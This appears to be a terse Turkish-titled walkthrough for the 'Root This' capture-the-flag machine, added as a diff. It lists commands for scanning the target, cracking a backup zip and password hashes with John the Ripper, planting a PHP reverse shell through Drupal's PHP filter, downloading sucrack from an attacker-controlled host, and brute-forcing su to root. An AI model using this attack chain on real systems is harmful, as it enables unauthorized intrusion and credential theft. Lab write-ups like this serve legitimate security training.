@@ -1,0 +1,22 @@
+ROOT THIS MAKİNE ÇÖZÜMÜ
+1 - netdiscover -i eth0 ile IP adresi 192.168.2.61 bulundu.
+2 - nmap -A 192.168.2.61
+3 - gobuster dir -u http://192.168.2.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.61/backup
+5 - zip2john backup > hash
+6 - john hash -w=/usr/share/wordlists/rockyou.txt, thebackup
+7 - john hash -w=/usr/share/wordlists/rockyou.txt
+'root','*7AFEAE5774E672996251E09B946CB3953FC67656' -> ?
+'webman','*9AF2F8E8C08165DC70FA4B4F8D40EA6EC84CB6D2' -> moranguita
+8 - http://192.168.2.61/drupal
+9 - Modules -> Tick PHP Filter
+10 - cp /usr/share/webshells/php/php-reverse-shell.php .
+11 - Add Content -> Basic -> Paste Shell
+12 - cat /home/user/MessageToRoot.txt
+13 - https://github.com/hemp3l/sucrack
+14 - zip sucrack
+15 - wget http://192.168.2.128:8000/sucrack.zip, unzip sucrack.zip
+16 - wget http://192.168.2.128:8000/rockyou.txt
+17 - unzip sucrack.zip
+18 - ./sucrack -u root /tmp/rockyou.txt
+19 - whoami
